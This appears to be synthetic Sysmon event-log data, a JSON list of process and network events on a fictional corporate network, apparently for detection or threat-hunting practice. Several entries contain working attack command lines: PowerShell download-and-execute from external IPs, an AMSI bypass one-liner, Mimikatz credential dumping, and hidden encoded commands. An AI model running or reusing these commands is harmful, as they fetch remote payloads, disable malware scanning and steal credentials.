[
  {
    "EventID": 1,
    "Computer": "wkstn-01.corp.local",
    "UtcTime": "2023-10-27T08:15:00.000Z",
    "User": "CORP\\jsmith",
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "Hashes": "MD5=5746BD7E155F5FA55F559079A3DB5504,SHA256=17F746D82695FA9B35493B41859D39D788D3B62040E020E5F1E4A346C898AE5A",
    "ProcessId": 1234
  },
  {
    "EventID": 1,
    "Computer": "wkstn-01.corp.local",
    "UtcTime": "2023-10-27T08:16:05.123Z",
    "User": "CORP\\jsmith",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -EncodedCommand JABz... -WindowStyle Hidden -NoProfile",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "Hashes": "MD5=B29AFEDC376F3DF6136BECCEEFA0F733,SHA256=9F910901FAEA8C8E6819DE3DF3CE3AC5E51CB33246BB543ACF869A662DFB1CDE",
    "ProcessId": 1238
  },
  {
    "EventID": 1,
    "Computer": "srv-01.corp.local",
    "UtcTime": "2023-10-27T08:18:10.000Z",
    "User": "NT AUTHORITY\\SYSTEM",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.45/payload.ps1')",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "Hashes": "MD5=B29AFEDC376F3DF6136BECCEEFA0F733,SHA256=9F910901FAEA8C8E6819DE3DF3CE3AC5E51CB33246BB543ACF869A662DFB1CDE",
    "ProcessId": 4422
  },
  {
    "EventID": 1,
    "Computer": "wkstn-02.corp.local",
    "UtcTime": "2023-10-27T08:19:15.555Z",
    "User": "CORP\\admin",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "Hashes": "MD5=B29AFEDC376F3DF6136BECCEEFA0F733,SHA256=9F910901FAEA8C8E6819DE3DF3CE3AC5E51CB33246BB543ACF869A662DFB1CDE",
    "ProcessId": 5612
  },
  {
    "EventID": 1,
    "Computer": "wkstn-02.corp.local",
    "UtcTime": "2023-10-27T08:20:20.111Z",
    "User": "CORP\\admin",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell -ExecutionPolicy Bypass -File C:\\temp\\deploy.ps1",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "Hashes": "MD5=B29AFEDC376F3DF6136BECCEEFA0F733,SHA256=9F910901FAEA8C8E6819DE3DF3CE3AC5E51CB33246BB543ACF869A662DFB1CDE",
    "ProcessId": 5620
  },
  {
    "EventID": 1,
    "Computer": "srv-02.corp.local",
    "UtcTime": "2023-10-27T08:21:25.999Z",
    "User": "NT AUTHORITY\\SYSTEM",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell Invoke-Mimikatz -DumpCreds",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "Hashes": "MD5=B29AFEDC376F3DF6136BECCEEFA0F733,SHA256=9F910901FAEA8C8E6819DE3DF3CE3AC5E51CB33246BB543ACF869A662DFB1CDE",
    "ProcessId": 3311
  },
  {
    "EventID": 3,
    "Computer": "wkstn-03.corp.local",
    "UtcTime": "2023-10-27T08:22:30.000Z",
    "User": "CORP\\jsmith",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "SourceIp": "192.168.1.100",
    "SourcePort": 55432,
    "DestinationIp": "203.0.113.100",
    "DestinationPort": 4444,
    "Protocol": "tcp",
    "ProcessId": 1056
  },
  {
    "EventID": 3,
    "Computer": "srv-01.corp.local",
    "UtcTime": "2023-10-27T08:23:45.000Z",
    "User": "NT AUTHORITY\\SYSTEM",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "SourceIp": "192.168.1.50",
    "SourcePort": 49155,
    "DestinationIp": "198.51.100.45",
    "DestinationPort": 443,
    "Protocol": "tcp",
    "ProcessId": 4422
  },
  {
    "EventID": 1,
    "Computer": "wkstn-01.corp.local",
    "UtcTime": "2023-10-27T08:25:00.000Z",
    "User": "CORP\\jsmith",
    "Image": "C:\\Windows\\System32\\notepad.exe",
    "CommandLine": "notepad.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "Hashes": "MD5=F203CDD47B090F16C0CDBFBE1CB2B36D,SHA256=4D201A511BB564DD140E573887FAEC34188DB7C25E5004EA7B2A8887BDDBDDAD",
    "ProcessId": 6788
  },
  {
    "EventID": 1,
    "Computer": "wkstn-04.corp.local",
    "UtcTime": "2023-10-27T08:27:10.000Z",
    "User": "CORP\\admin",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell -w hidden -nop -ep bypass -c \"IEX(IWR http://203.0.113.50/stager.ps1)\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "Hashes": "MD5=B29AFEDC376F3DF6136BECCEEFA0F733,SHA256=9F910901FAEA8C8E6819DE3DF3CE3AC5E51CB33246BB543ACF869A662DFB1CDE",
    "ProcessId": 8901
  }
]
